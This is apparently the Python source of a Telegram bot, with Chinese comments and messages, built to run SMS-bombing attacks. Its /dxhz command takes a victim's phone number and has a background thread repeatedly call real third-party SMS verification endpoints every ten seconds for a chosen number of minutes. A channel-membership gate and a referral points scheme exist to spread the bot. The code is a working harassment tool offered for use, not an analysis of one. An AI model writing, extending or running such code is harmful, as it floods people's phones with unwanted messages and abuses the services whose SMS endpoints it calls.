import os
import requests
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    CommandHandler, CallbackContext, Updater
)
from threading import Thread

# 从环境变量中读取 TELEGRAM_API_TOKEN
TELEGRAM_API_TOKEN = os.getenv("TELEGRAM_API_TOKEN")

# 定义短信接口 URL 列表
urls = [
    "https://card.10010.com/ko-order/messageCaptcha/send?phoneVal={idcard}",
    "https://xcx.wjhr.net/project-xcx/smsController/sendCode2.action?phone={idcard}",
    # Add the rest of your URLs here...
]

# 定义频道的用户名（没有 @ 符号）
CHANNEL_USERNAME = 'pubgtianshenkar'

# 初始化用户积分系统
user_points = {}
invite_links = {}
user_invites = {}

def start(update, context):
    keyboard = [[InlineKeyboardButton("天神主频道", url="https://t.me/{}".format(CHANNEL_USERNAME))]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text(
        "请加入主频道后才使用此机器人",
        reply_markup=reply_markup
    )

def check_user_in_channel(context, user_id):
    try:
        chat_member = context.bot.get_chat_member(chat_id="@{}".format(CHANNEL_USERNAME), user_id=user_id)
        return chat_member.status in ["member", "administrator", "creator"]
    except Exception:
        return False

def add_points(inviter_id, points=2):
    user_points[inviter_id] = user_points.get(inviter_id, 0) + points
    user_invites[inviter_id] = user_invites.get(inviter_id, 0) + 1

def share(update, context):
    user_id = update.message.from_user.id
    username = update.message.from_user.username or "未设置用户名"

    if user_id not in invite_links:
        invite_links[user_id] = "https://t.me/{}?start={}".format(context.bot.username, user_id)

    points = user_points.get(user_id, 0)
    invites = user_invites.get(user_id, 0)

    update.message.reply_text(
        "用户名: {}\n"
        "你的专属邀请链接是: {}\n"
        "你已邀请: {} 人\n"
        "你的积分: {}".format(username, invite_links[user_id], invites, points)
    )

def handle_invitation(update, context):
    user_id = update.message.from_user.id
    inviter_id = context.args[0] if context.args else None

    if not check_user_in_channel(context, user_id):
        update.message.reply_text("请先加入频道后再使用此命令！")
        return

    if inviter_id and inviter_id.isdigit():
        add_points(int(inviter_id), points=2)
        update.message.reply_text("感谢加入！已获得2积分。")

def bombard_phone(idcard, duration_minutes):
    end_time = time.time() + duration_minutes * 60
    while time.time() < end_time:
        for url in urls:
            try:
                full_url = url.format(idcard=idcard)
                response = requests.get(full_url)
                if response.status_code == 200:
                    print("请求成功: {}".format(full_url))
                else:
                    print("请求失败: {} - 状态码: {}".format(full_url, response.status_code))
            except Exception as e:
                print("请求错误: {} - 错误信息: {}".format(url, e))
        time.sleep(10)

def dxhz(update, context):
    user_id = update.message.from_user.id

    if not check_user_in_channel(context, user_id):
        update.message.reply_text("请先加入频道后再使用此命令！")
        return

    if len(context.args) < 1:
        update.message.reply_text("请提供一个手机号！正确用法：/dxhz 12345678901 [分钟数]")
        return

    idcard = context.args[0]
    duration_minutes = int(context.args[1]) if len(context.args) > 1 else 5

    required_points = duration_minutes // 5

    if user_points.get(user_id, 0) < required_points:
        update.message.reply_text("您的积分不足，请分享您的邀请链接以获取更多积分。")
        return

    user_points[user_id] -= required_points

    update.message.reply_text("正在对手机号 {} 进行短信轰炸，持续 {} 分钟...".format(idcard, duration_minutes))

    Thread(target=bombard_phone, args=(idcard, duration_minutes)).start()

def main():
    updater = Updater(token=TELEGRAM_API_TOKEN)

    updater.dispatcher.add_handler(CommandHandler("start", start))
    updater.dispatcher.add_handler(CommandHandler("share", share))
    updater.dispatcher.add_handler(CommandHandler("dxhz", dxhz))
    updater.dispatcher.add_handler(CommandHandler("start", handle_invitation))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
